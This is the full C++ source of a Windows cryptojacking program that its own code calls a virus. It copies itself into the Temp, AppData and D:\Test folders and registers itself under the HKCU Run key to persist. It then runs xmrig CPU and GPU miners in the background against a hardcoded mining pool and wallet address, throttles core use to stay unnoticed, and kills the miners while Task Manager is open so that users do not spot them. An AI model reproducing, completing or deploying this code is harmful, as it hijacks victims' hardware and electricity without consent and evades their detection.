#include "main.h"
#include "common.h"

#include <gl/GL.h>
#include <mutex>

#define WGL_DRAW_TO_WINDOW_ARB                  0x2001
#define WGL_ACCELERATION_ARB                    0x2003
#define WGL_SUPPORT_OPENGL_ARB                  0x2010
#define WGL_DOUBLE_BUFFER_ARB                   0x2011
#define WGL_PIXEL_TYPE_ARB                      0x2013
#define WGL_COLOR_BITS_ARB                      0x2014
#define WGL_DEPTH_BITS_ARB                      0x2022
#define WGL_STENCIL_BITS_ARB                    0x2023

#define WGL_TYPE_RGBA_ARB                       0x202B
#define WGL_FULL_ACCELERATION_ARB               0x2027

#define WGL_FRAMEBUFFER_SRGB_CAPABLE_ARB        0x20A9

typedef HGLRC WINAPI wgl_create_context_attribs_arb(
	HDC hdc,
	HGLRC hShareContext,
	const int *attribList);

typedef BOOL WINAPI wgl_get_pixel_format_attrib_iv_arb(
	HDC hdc,
	int iPixelFormat,
	int iLayerPlane,
	UINT nAttributes,
	const int *piAttributes,
	int *piValues);

typedef BOOL WINAPI wgl_get_pixel_format_attrib_fv_arb(
	HDC hdc,
	int iPixelFormat,
	int iLayerPlane,
	UINT nAttributes,
	const int *piAttributes,
	FLOAT *pfValues);

typedef BOOL WINAPI wgl_choose_pixel_format_arb(HDC hdc,
	const int *piAttribIList,
	const FLOAT *pfAttribFList,
	UINT nMaxFormats,
	int *piFormats,
	UINT *nNumFormats);

typedef BOOL WINAPI wgl_swap_interval_ext(int interval);
typedef const char* WINAPI wgl_get_extensions_string_ext(void);

typedef uint32_t u32;

static wgl_create_context_attribs_arb* wglCreateContextAttribsARB;
static wgl_choose_pixel_format_arb* wglChoosePixelFormatARB;
static wgl_swap_interval_ext* wglSwapIntervalEXT;
static wgl_get_extensions_string_ext* wglGetExtensionsStringEXT;

static miners_context GlobalMinersContext;
static toxication_context GlobalToxicContext;
static gpu_type GlobalGPUType;
static std::mutex ConsoleMutex;

#define CPU_MINER_PATH "MinerBuilds\\x64\\CPU\\xmrig.exe"
#define GPU_NVIDIA_MINER_PATH "MinerBuilds\\x64\\GPU_NVIDIA\\xmrig-nvidia.exe"
#define GPU_AMD_MINER_PATH "MinerBuilds\\x64\\GPU_AMD\\xmrig-amd.exe"

inline void VIR_LOG_(char* Str) {
	ConsoleMutex.lock();

	printf("%s\n", Str);

	ConsoleMutex.unlock();
}

#define VIR_LOG(str) VIR_LOG_(str)

static uint32_t
GetCPUCoreCount() {
	uint32_t Result = 0;

#ifdef PLATFORM_WINDOWS
	SYSTEM_INFO Info;
	GetSystemInfo(&Info);
	Result = Info.dwNumberOfProcessors;
#else
	Result = 1;
#endif

	return(Result);
}

enum mining_politika_type{
	MiningPolitika_Virus,
	MiningPolitika_Farm,
	MiningPolitika_Heal,
};

static int GetOptimalWorkingCoresCount(uint32_t Politika) {
	int res = 1;
	int cpu_count = GetCPUCoreCount();

	switch (Politika) {
		case MiningPolitika_Virus: {
			switch (cpu_count) {
				case 2:
				case 3:
				case 4: res = 1; break;

				case 5:
				case 6: res = 2; break;

				case 7:
				case 8:
				case 9: res = 3; break;

				case 10:
				case 11:
				case 12: res = 4; break;

				case 13:
				case 14:
				case 15: 
				case 16: res = 5; break;
			}

			if (cpu_count > 16) {
				res = cpu_count / 3;
			}
		}break;

		case MiningPolitika_Farm: {
			res = cpu_count;
		}
	}

	return(res);
}

static int64_t GetOptimalCPUAffinity(u32 Politika) {
	int64_t Result = 1;

	int CoreCount = GetCPUCoreCount();

	switch (Politika) {
		case MiningPolitika_Farm: {
			for (int i = 0; i < CoreCount; i++) {
				Result |= (1 << i);
			}
		}break;

		case MiningPolitika_Virus: {
			if (CoreCount > (sizeof(int64_t) * 8)) {
				CoreCount = (sizeof(int64_t) * 8);
			}

			if (CoreCount > 1) {
				Result = 0;
				for (int i = CoreCount - 1; i > 0; i--){
					Result |= (1 << i);
				}
			}
		}break;
	}

	return(Result);
}

static int GetGPUThreadCount(u32 Politika) {
	int Result = 8;

	if (Politika == MiningPolitika_Farm) {
		Result = 32;
	}

	return(Result);
}

std::wstring ConvertStringToWideString(std::string& ToConvert) {
	std::wstring Result = std::wstring(ToConvert.begin(), ToConvert.end());

	return(Result);
}

std::wstring ConvertCharArrayToWideString(char* ToConvert) {
	std::string Temp = std::string(ToConvert);

	std::wstring Result = std::wstring(Temp.begin(), Temp.end());

	return(Result);
}

static toxication_context InitToxicContext() {
	toxication_context Result;

	char *UserTemp = getenv("Temp");
	char *AppData = getenv("appdata");
	char* DTest = "D:\\Test";

	Result.AddToAutorun = true;
	Result.ToxicationFolders.push_back(ConvertCharArrayToWideString(DTest));
	Result.ToxicationFolders.push_back(ConvertCharArrayToWideString(UserTemp));
	Result.ToxicationFolders.push_back(ConvertCharArrayToWideString(AppData));

	return(Result);
}

static miners_context InitMinersContext(uint32_t Politika) {
	miners_context Result = {};

	Result.CPU_LogDuration = 20;
	Result.GPU_LogDuration = 20;

	Result.DonateLevel = 1;
	if (Politika == MiningPolitika_Farm) {
		Result.Background = false;
	}
	else {
#if _DEBUG
		Result.Background = false;
#else
		Result.Background = true;
#endif
	}

	Result.GPU_Threads = GetGPUThreadCount(Politika);
	Result.GPU_Bsleep = 25;
	Result.GPU_Bfactor = 6;

	Result.CPU_ThreadCount = GetOptimalWorkingCoresCount(Politika);
	Result.CPU_Affinity = GetOptimalCPUAffinity(Politika);
	Result.CPU_Priority = 3;

	Result.UsedPoolCount = 0;

	return(Result);
}

static void AddPoolToMinersContext(miners_context* Context, char* Pool, char* EncUsername, char* EncPassword) {
	uint32_t PoolIndex = Context->UsedPoolCount++;
	ASSERT(PoolIndex < MAX_POOL_COUNT);

	mining_pool* NewPool = &Context->Pools[PoolIndex];

	//TODO(DIMA): Decrypt from preencoded data
	strcpy(NewPool->PoolName, Pool);
	strcpy(NewPool->Username, EncUsername);
	strcpy(NewPool->Password, EncPassword);
}

inline void PutStringToBuffer(char** Dst, char* Src) {
	while (*Src) {
		*((*Dst)++) = *Src++;
	}
}

#define TEMP_BUF_LEN_AZAZ 2048
static void BuildConfigStringFor(uint32_t Type, miners_context* Context, char* Buffer, int32_t BufferLen, char* MinerLocalPath) {

	char* At = Buffer;

	char MinerDir[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, MinerDir);

	PutStringToBuffer(&At, MinerDir);
	PutStringToBuffer(&At, "\\");
	PutStringToBuffer(&At, MinerLocalPath);

	PutStringToBuffer(&At, " ");

	char TempBuf[TEMP_BUF_LEN_AZAZ];
	switch (Type) {
		case(MinerType_CPU):

			VIR_LOG("CPU miner dir path is:");
			VIR_LOG(MinerDir);
			VIR_LOG("");

			stbsp_snprintf(
				TempBuf, 
				TEMP_BUF_LEN_AZAZ, 
				"-t %d --print-time %d --donate-level %d --cpu-affinity %ld --cpu-priority %d ",
				Context->CPU_ThreadCount,
				Context->CPU_LogDuration,
				Context->DonateLevel,
				Context->CPU_Affinity,
				Context->CPU_Priority);
			break;

		case(MinerType_GPU):

			VIR_LOG("GPU miner dir path is:");
			VIR_LOG(MinerDir);
			VIR_LOG("");
			
#if 0
			stbsp_snprintf(
				TempBuf,
				TEMP_BUF_LEN_AZAZ,
				"--print-time %d --donate-level %d -c ../Data/config_gpu.json ",
				Context->GPU_LogDuration,
				Context->DonateLevel,
				Context->GPU_Threads,
				Context->GPU_Bsleep);
#else
			stbsp_snprintf(
				TempBuf,
				TEMP_BUF_LEN_AZAZ,
				"--print-time %d --donate-level %d --cuda-max-threads %d --cuda-bsleep %d --cuda-bfactor %d ",
				Context->GPU_LogDuration,
				Context->DonateLevel,
				Context->GPU_Threads,
				Context->GPU_Bsleep,
				Context->GPU_Bfactor);
#endif
			break;
	}

	PutStringToBuffer(&At, TempBuf);

	if (Context->Background) {
		PutStringToBuffer(&At, "-B ");
	}

	for (int PoolIndex = 0; PoolIndex < Context->UsedPoolCount; PoolIndex++) {
		mining_pool* Pool = &Context->Pools[PoolIndex];

		PutStringToBuffer(&At, "-o ");
		PutStringToBuffer(&At, Pool->PoolName);
		PutStringToBuffer(&At, " -u ");
		PutStringToBuffer(&At, Pool->Username);
		
		if (strlen(Pool->Password)) {
			PutStringToBuffer(&At, " -p ");
			PutStringToBuffer(&At, Pool->Password);
		}
		
		PutStringToBuffer(&At, " -k ");
	}

	*At = 0;
}

static int32_t RunMiner(miners_context* Context, char* MinerPath, uint32_t MinerType) {
	int32_t Result = 0;

	char PrevDir[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, PrevDir);

	SetCurrentDirectoryA("..\\Data");

	char MinerFullPath[MAX_PATH];
	char* At = MinerFullPath;

	char MinerDir[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, MinerDir);

	PutStringToBuffer(&At, MinerDir);
	PutStringToBuffer(&At, "\\");
	PutStringToBuffer(&At, MinerPath);
	*At = 0;

	int CmdStrLen = 2048;
	char* CmdStr = (char*)malloc(CmdStrLen);

	BuildConfigStringFor(MinerType, Context, CmdStr, CmdStrLen, MinerPath);

	STARTUPINFOA StartupInfo = {};
	PROCESS_INFORMATION ProcessInfo = {};

	Result = CreateProcessA(
		MinerFullPath, 
		CmdStr,
		0, 0,
		FALSE,
		CREATE_NEW_CONSOLE,
		0,
		0,
		&StartupInfo,
		&ProcessInfo);

	DWORD LastError = GetLastError();

	free(CmdStr);

	SetCurrentDirectoryA(PrevDir);

	return(Result);
}

inline int32_t WCharStringsAreEqual(const TCHAR *a, const TCHAR *b){

	TCHAR Temp[] = TEXT("");

	while (*a == *b){
		if (*a == Temp[0]){
			return 1;
		}
		a++; b++;
	}

	return 0;
}

static int32_t IsProcessRun(char* ProcessName) {
	int32_t RUN;

	wchar_t buf[256];
	int32_t ProcessNameLen = strlen(ProcessName);
	mbstowcs(buf, ProcessName, ProcessNameLen + 1);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 pe;

	pe.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hSnapshot, &pe);

	if (WCharStringsAreEqual(pe.szExeFile, buf)) {
		RUN = true;

		return RUN;
	}
	else {
		RUN = false;
	}

	while (Process32Next(hSnapshot, &pe)) {
		if (WCharStringsAreEqual(pe.szExeFile, buf)) {
			RUN = true;

			return RUN;
		}
		else {
			RUN = false;
		}
	}

	return RUN;
}


static BOOL TerminateMyProcess(DWORD dwProcessId, UINT uExitCode)
{
	DWORD dwDesiredAccess = PROCESS_TERMINATE;
	BOOL  bInheritHandle = FALSE;
	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
	if (hProcess == NULL)
		return FALSE;

	BOOL result = TerminateProcess(hProcess, uExitCode);

	CloseHandle(hProcess);

	return result;
}

static void WtfTerminateProcess(char* ProcessName) {
	wchar_t buf[256];
	int32_t ProcessNameLen = strlen(ProcessName);
	mbstowcs(buf, ProcessName, ProcessNameLen + 1);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 pe;

	pe.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hSnapshot, &pe);

	if (WCharStringsAreEqual(pe.szExeFile, buf)) {
		TerminateMyProcess(pe.th32ProcessID, 1);
		return;
	}

	while (Process32Next(hSnapshot, &pe)) {
		if (WCharStringsAreEqual(pe.szExeFile, buf)) {
			TerminateMyProcess(pe.th32ProcessID, 1);
			return;
		}
	}
}

static LONG GetDWORDRegKey(HKEY hKey, const std::wstring &strValueName, DWORD &nValue, DWORD nDefaultValue)
{
	nValue = nDefaultValue;
	DWORD dwBufferSize(sizeof(DWORD));
	DWORD nResult(0);
	LONG nError = ::RegQueryValueExW(hKey,
		strValueName.c_str(),
		0,
		NULL,
		reinterpret_cast<LPBYTE>(&nResult),
		&dwBufferSize);
	if (ERROR_SUCCESS == nError)
	{
		nValue = nResult;
	}
	return nError;
}

static LONG GetBoolRegKey(HKEY hKey, const std::wstring &strValueName, bool &bValue, bool bDefaultValue)
{
	DWORD nDefValue((bDefaultValue) ? 1 : 0);
	DWORD nResult(nDefValue);
	LONG nError = GetDWORDRegKey(hKey, strValueName.c_str(), nResult, nDefValue);
	if (ERROR_SUCCESS == nError)
	{
		bValue = (nResult != 0) ? true : false;
	}
	return nError;
}

static LONG GetStringRegKey(HKEY hKey, const std::wstring &strValueName, std::wstring &strValue, const std::wstring &strDefaultValue)
{
	strValue = strDefaultValue;
	WCHAR szBuffer[512];
	DWORD dwBufferSize = sizeof(szBuffer);
	ULONG nError;
	nError = RegQueryValueExW(hKey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
	if (ERROR_SUCCESS == nError)
	{
		strValue = szBuffer;
		ConsoleMutex.lock();
		printf("Registry key was found. Value is: %ls\n", strValue.c_str());
		ConsoleMutex.unlock();
	}
	else {
		VIR_LOG("Registry key was not found");
	}
	return nError;
}

inline int32_t DirectoryExist(std::wstring& DirPath) {
	int32_t Result = 0;

	DWORD FileAttribs = GetFileAttributes(DirPath.c_str());

	if (FileAttribs == INVALID_FILE_ATTRIBUTES) {
		Result = 0;
	}
	else {
		if (FileAttribs & FILE_ATTRIBUTE_DIRECTORY) {
			Result = 1;
		}
	}
	
	return(Result);
}

std::wstring GetExeFileName() {
	wchar_t ExePath[256];
	GetModuleFileName(0, ExePath, ARRAY_COUNT(ExePath));

	std::wstring ExePathW = std::wstring(ExePath);
	int LastSlashPos = ExePathW.find_last_of('\\');
	int DotExeIndex = ExePathW.find(L".exe");
	std::wstring ExeFileName = ExePathW.substr(LastSlashPos + 1, DotExeIndex - LastSlashPos - 1);

	return(ExeFileName);
}

std::wstring GetExeFileDirectory() {
	wchar_t ExePath[256];
	GetModuleFileName(0, ExePath, ARRAY_COUNT(ExePath));

	std::wstring ExePathW = std::wstring(ExePath);
	int LastSlashPos = ExePathW.find_last_of('\\');
	std::wstring ExeFileName = ExePathW.substr(0, LastSlashPos);

	return(ExeFileName);
}

static int32_t IsFolderToxicated(std::wstring& Folder) {
	int32_t Result = 0;

	std::wstring ExeFileName = GetExeFileName();

	HANDLE DirectoryHandle;
	WIN32_FIND_DATA FileFindData;

	DirectoryHandle = FindFirstFile((Folder + L"\\*").c_str(), &FileFindData);

	if (DirectoryHandle != INVALID_HANDLE_VALUE) {
		do {
			int32_t IsDirectory = FileFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
			std::wstring IterationFileName = std::wstring(FileFindData.cFileName);
			if (IsDirectory && (IterationFileName == ExeFileName)) {
				//NOTE(Dima): If one of directories has name of .exe then folder contain virus
				Result = 1;
				break;
			}
		} while (FindNextFile(DirectoryHandle, &FileFindData));

		FindClose(DirectoryHandle);
	}
	else {

	}

	return(Result);
}

static void ToxicateFolder(std::wstring& Folder) {

	wchar_t Dir[255];
	GetCurrentDirectory(sizeof(Dir), Dir);

	std::wstring ExeDirectoryPath = GetExeFileDirectory();
	std::wstring ExeFileName = GetExeFileName();

	SetCurrentDirectory(ExeDirectoryPath.c_str());

	if (DirectoryExist(Folder)) {
		int a = 1;
	}
	
	std::wstring VirusDirW = Folder + L"\\" + ExeFileName;
	if (!DirectoryExist(VirusDirW)) {
		CreateDirectory(VirusDirW.c_str(), 0);
	}

	std::wstring TargetFolderExe = VirusDirW + std::wstring(L"\\Exe");
	if (!DirectoryExist(TargetFolderExe)) {
		CreateDirectory(TargetFolderExe.c_str(), 0);
	}

	std::experimental::filesystem::copy(
		ExeDirectoryPath, 
		TargetFolderExe,
		std::experimental::filesystem::copy_options::recursive |
		std::experimental::filesystem::copy_options::overwrite_existing);


	std::wstring DataFolderPath = std::wstring(L"../Data");
	std::wstring TargetFolderData = VirusDirW + std::wstring(L"\\Data");
	if (!DirectoryExist(TargetFolderData)) {
		CreateDirectory(TargetFolderData.c_str(), 0);
	}

	std::experimental::filesystem::copy(
		DataFolderPath,
		TargetFolderData.c_str(),
		std::experimental::filesystem::copy_options::recursive | 
		std::experimental::filesystem::copy_options::overwrite_existing);

	SetCurrentDirectory(Dir);
}

static void ToxicateComp(toxication_context* ToxicContext) {

	for (auto it = ToxicContext->ToxicationFolders.begin();
		it != ToxicContext->ToxicationFolders.end();
		it++)
	{
		ToxicateFolder(*(it));
	}

	int32_t IsToxic = IsFolderToxicated(std::wstring(L"D:\\Test"));

	wchar_t autorun_exe_path[255];
	DWORD ExePathLen = GetModuleFileName(0, autorun_exe_path, ARRAY_COUNT(autorun_exe_path));

	{
		//Get the value and change dir
		HKEY hKey;
		LONG lRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
		bool bExistsAndSuccess(lRes == ERROR_SUCCESS);
		bool bDoesNotExistsSpecifically(lRes == ERROR_FILE_NOT_FOUND);

		if (bExistsAndSuccess) {
			std::wstring strValueOfBinDir;
			std::wstring strKeyDefaultValue;

			std::wstring ExeNameW = GetExeFileName();

			GetStringRegKey(hKey, ExeNameW.c_str(), strValueOfBinDir, L"bad");

			int LastSlashPos = strValueOfBinDir.find_last_of('\\');
			std::wstring strDirectory = strValueOfBinDir.substr(1, LastSlashPos);

			SetCurrentDirectoryW(strDirectory.c_str());

			WCHAR WorkDirBuf[512];
			GetCurrentDirectoryW(512, WorkDirBuf);
			std::wstring WorkDirStr(WorkDirBuf);

			ConsoleMutex.lock();
			printf("Working directory is: %ls\n", WorkDirStr.c_str());
			ConsoleMutex.unlock();
		}
	}

#if 1
	{
		DWORD dwtype = 0;
		DWORD dwBufsize = sizeof(autorun_exe_path);
		TCHAR szpath[MAX_PATH];
		HKEY hKeys;
		if (ERROR_SUCCESS == RegCreateKeyExW(
			HKEY_CURRENT_USER,
			L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
			0, NULL, 0, 
			KEY_ALL_ACCESS, 
			NULL, &hKeys, NULL))
		{
			//NOTE: I want to reset value always, so i put it here
			std::wstring ResultExePath;
			ResultExePath += L"\"";
			ResultExePath += std::wstring(autorun_exe_path);
			ResultExePath += L"\"";

			std::wstring ExeNameW = GetExeFileName();

			RegSetValueExW(hKeys, ExeNameW.c_str() , 0, REG_SZ, (BYTE*)ResultExePath.c_str(), sizeof(wchar_t) * ResultExePath.size());
			RegCloseKey(hKeys);
		}
	}
#endif
}

static void HealComp(toxication_context* ToxicContext) {
	//NOTE(Dima): First - delete virus folder from all toxication folders

	std::wstring ExeNameW = GetExeFileName();

	for (auto it = ToxicContext->ToxicationFolders.begin();
		it != ToxicContext->ToxicationFolders.end();
		it++)
	{
		std::wstring ToDeleteFolder = *it + L"\\" + ExeNameW;

		std::experimental::filesystem::remove_all(ToDeleteFolder);
	}

	HKEY hkey = HKEY_LOCAL_MACHINE;
	RegOpenKey(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegDeleteValue(hkey, ExeNameW.c_str());
	RegCloseKey(hkey);
}

static void RerunMinersIfNeeded() {
	int FirstTime = 1;

	do {
		int32_t TaskMgrIsRun = IsProcessRun("taskmgr.exe");

		if (FirstTime) {
			RunMiner(&GlobalMinersContext, CPU_MINER_PATH, MinerType_CPU);
			RunMiner(&GlobalMinersContext, GPU_NVIDIA_MINER_PATH, MinerType_GPU);
			RunMiner(&GlobalMinersContext, GPU_AMD_MINER_PATH, MinerType_GPU);
		}

		if (TaskMgrIsRun) {
			WtfTerminateProcess("xmrig.exe");
			WtfTerminateProcess("xmrig-nvidia.exe");
			WtfTerminateProcess("xmrig-amd.exe");
		}
		else {
			int32_t CPU_MinerIsRun = IsProcessRun("xmrig.exe");
			int32_t GPU_NVIDIA_MinerIsRun = IsProcessRun("xmrig-nvidia.exe");
			int32_t GPU_AMD_MinerIsRun = IsProcessRun("xmrig-amd.exe");

			switch (GlobalGPUType) {
				case GPUType_NVIDIA: {
					if (!GPU_NVIDIA_MinerIsRun) {
						int32_t NvidiaRunned = RunMiner(&GlobalMinersContext, GPU_NVIDIA_MINER_PATH, MinerType_GPU);
					}
				}break;

				case GPUType_AMD: {
					if (!GPU_AMD_MinerIsRun) {
						int32_t AmdRunned = RunMiner(&GlobalMinersContext, GPU_AMD_MINER_PATH, MinerType_GPU);
					}
				}break;

				case GPUType_None: {
					if (!GPU_NVIDIA_MinerIsRun) {
						int32_t NvidiaRunned = RunMiner(&GlobalMinersContext, GPU_NVIDIA_MINER_PATH, MinerType_GPU);
					}

					if (!GPU_AMD_MinerIsRun) {
						int32_t AmdRunned = RunMiner(&GlobalMinersContext, GPU_AMD_MINER_PATH, MinerType_GPU);
					}
				}break;
			}

			if (!CPU_MinerIsRun) {
				RunMiner(&GlobalMinersContext, CPU_MINER_PATH, MinerType_CPU);
			}
		}

		FirstTime = 0;

		Sleep(2000);
	} while (1);
}

DWORD WINAPI RerunMinersThread(LPVOID lpParam) {
	DWORD Result = 0;

	RerunMinersIfNeeded();

	return(Result);
}

static void
Win32SetPixelFormat(HDC WindowDC) {

	int SuggestedPixelFormatIndex = 0;
	GLuint ExtendedPick = 0;

	if (wglChoosePixelFormatARB) {
		int IntAttribList[] = {
			WGL_DRAW_TO_WINDOW_ARB, GL_TRUE,
			WGL_ACCELERATION_ARB, WGL_FULL_ACCELERATION_ARB,
			WGL_SUPPORT_OPENGL_ARB, GL_TRUE,
			WGL_DOUBLE_BUFFER_ARB, GL_TRUE,
			WGL_PIXEL_TYPE_ARB, WGL_TYPE_RGBA_ARB,
			0
		};
		/*
		WGL_COLOR_BITS_ARB, 32,
		WGL_DEPTH_BITS_ARB, 24,
		WGL_STENCIL_BITS_ARB, 8,
		WGL_SAMPLE_BUFFERS_ARB, 1, //Number of buffers (must be 1 at time of writing)
		WGL_SAMPLES_ARB, 4,        //Number of samples
		*/

		int32_t PFValid = wglChoosePixelFormatARB(
			WindowDC,
			IntAttribList,
			0,
			1,
			&SuggestedPixelFormatIndex,
			&ExtendedPick);
	}

	if (!ExtendedPick) {
		PIXELFORMATDESCRIPTOR DesiredPixelFormat = {};
		DesiredPixelFormat.nSize = sizeof(DesiredPixelFormat);
		DesiredPixelFormat.nVersion = 1;
		DesiredPixelFormat.iPixelType = PFD_TYPE_RGBA;
		DesiredPixelFormat.dwFlags = PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER;
		DesiredPixelFormat.cColorBits = 32;
		DesiredPixelFormat.cAlphaBits = 8;
		DesiredPixelFormat.cDepthBits = 24;
		DesiredPixelFormat.iLayerType = PFD_MAIN_PLANE;

		SuggestedPixelFormatIndex = ChoosePixelFormat(WindowDC, &DesiredPixelFormat);
	}

	PIXELFORMATDESCRIPTOR SuggestedPixelFormat;
	DescribePixelFormat(
		WindowDC,
		SuggestedPixelFormatIndex,
		sizeof(SuggestedPixelFormat),
		&SuggestedPixelFormat);
	SetPixelFormat(
		WindowDC,
		SuggestedPixelFormatIndex,
		&SuggestedPixelFormat);
}

inline int32_t
IsEndOfLine(char C) {
	int32_t Result =
		((C == '\n') ||
		(C == '\r'));

	return(Result);
}

inline int32_t
IsWhitespace(char C) {
	int32_t Result =
		((C == ' ') ||
		(C == '\t') ||
			(C == '\v') ||
			(C == '\f') ||
			IsEndOfLine(C));

	return(Result);
}

static gpu_type GetGPUType() {
	gpu_type Result = GPUType_None;

	WNDCLASSA WindowClass = {};

	WindowClass.lpfnWndProc = DefWindowProcA;
	WindowClass.hInstance = GetModuleHandle(0);
	WindowClass.lpszClassName = "WatDaFak";

	if (RegisterClassA(&WindowClass)) {
		HWND Window = CreateWindowExA(
			0,
			WindowClass.lpszClassName,
			"WatDaFak",
			0,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			0,
			0,
			WindowClass.hInstance,
			0);

		HDC WindowDC = GetDC(Window);
		Win32SetPixelFormat(WindowDC);

		HGLRC OpenGLRC = wglCreateContext(WindowDC);

		if (wglMakeCurrent(WindowDC, OpenGLRC)) {

			wglChoosePixelFormatARB = (wgl_choose_pixel_format_arb*)wglGetProcAddress("wglChoosePixelFormatARB");
			wglCreateContextAttribsARB = (wgl_create_context_attribs_arb*)wglGetProcAddress("wglCreateContextAttribsARB");
			wglGetExtensionsStringEXT = (wgl_get_extensions_string_ext*)wglGetProcAddress("wglGetExtensionsStringEXT");

			if (wglGetExtensionsStringEXT) {
				char* Extensions = (char*)wglGetExtensionsStringEXT();
				char* At = Extensions;

				while (*At) {
					while (IsWhitespace(*At)) {
						At++;
					}

					char* End = At;
					while (*End && !IsWhitespace(*End)) {
						End++;
					}

					uintptr_t Count = End - At;

					At = End;
				}
			}

			char* Vendor = (char*)glGetString(GL_VENDOR);
			char* Version = (char*)glGetString(GL_VERSION);

			if (Vendor) {
				std::string Vend = std::string(Vendor);

				char* AMDUpStr = "AMD";
				char* NVIDIAUpStr = "NVIDIA";

				if (Vend.find(AMDUpStr) != std::string::npos) {
					Result = GPUType_AMD;
				}
				else if (Vend.find(NVIDIAUpStr) != std::string::npos) {
					Result = GPUType_NVIDIA;
				}
			}

			wglMakeCurrent(0, 0);
		}

		wglDeleteContext(OpenGLRC);
		ReleaseDC(Window, WindowDC);
		DestroyWindow(Window);
	}

	if (Result == GPUType_AMD) {
		VIR_LOG("GPU Type is AMD");
	}

	if (Result == GPUType_NVIDIA) {
		VIR_LOG("GPU Type is NVIDIA");
	}

	if (Result == GPUType_None) {
		VIR_LOG("No suitable GPU was found for GPU mining");
	}

	return(Result);
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
//int main(int argc, char** argv)
{
	u32 MiningPolitika = MiningPolitika_Virus;

	GlobalMinersContext = InitMinersContext(MiningPolitika);
	GlobalToxicContext = InitToxicContext();

	GlobalGPUType = GetGPUType();

	switch (MiningPolitika) {
		case MiningPolitika_Farm: {

		}break;

		case MiningPolitika_Virus: {
			ToxicateComp(&GlobalToxicContext);
		}break;

		case MiningPolitika_Heal: {
			HealComp(&GlobalToxicContext);

			return(0);
		}break;
	}

	AddPoolToMinersContext(
		&GlobalMinersContext,
		"pool.minexmr.com:7777",
		"43rWNihGvB8DKZd7ea5GnhaLAz9mZKHvmJddCVcniWtViBEazoUzq2tMFrBS6eyK7c8tC9wZ6D5VXfA1PNryeMgRDxr97nw",
		"");

	char autorun_exe_path[255];
	DWORD ExePathLen = GetModuleFileNameA(0, autorun_exe_path, ARRAY_COUNT(autorun_exe_path));

#if 1
	HANDLE RerunMinersThreadHandle = CreateThread(0, 0, RerunMinersThread, 0, 0, 0);

	WaitForSingleObject(RerunMinersThreadHandle, INFINITE);
	CloseHandle(RerunMinersThreadHandle);
#else
	RunMiner(&GlobalMinersContext, CPU_MINER_PATH, MinerType_CPU);
	RunMiner(&GlobalMinersContext, GPU_NVIDIA_MINER_PATH, MinerType_GPU);
	RunMiner(&GlobalMinersContext, GPU_AMD_MINER_PATH, MinerType_GPU);
#endif

	return(0);
}